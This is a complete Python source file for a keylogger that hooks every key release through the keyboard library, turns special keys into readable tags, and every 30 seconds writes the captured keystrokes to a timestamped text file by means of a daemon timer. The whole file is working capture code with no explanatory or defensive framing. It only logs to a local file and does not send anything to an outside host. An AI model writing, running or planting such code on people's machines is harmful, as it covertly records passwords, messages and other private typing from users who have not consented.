import datetime
from threading import Timer
import keyboard

SEND_REPORT_EVERY = 30


class Keylogger:
    def __init__(self, interval, report_method="file"):
        self.report_method = report_method
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.datetime.now()
        self.end_dt = datetime.datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "_").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "_").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)

    def report(self):
        if self.log:
            self.end_dt = datetime.datetime.now()
            self.update_filename()
            if self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()